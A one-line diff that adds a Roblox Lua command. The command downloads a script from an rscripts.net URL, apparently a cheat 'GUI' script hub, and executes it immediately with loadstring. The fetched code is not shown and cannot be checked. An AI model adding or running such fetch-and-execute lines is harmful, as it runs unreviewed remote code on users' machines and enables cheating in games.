@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rscripts.net/raw/cat-gui-beta-shitty_1784012597719_ugPPzrWQ7T.txt",true))()
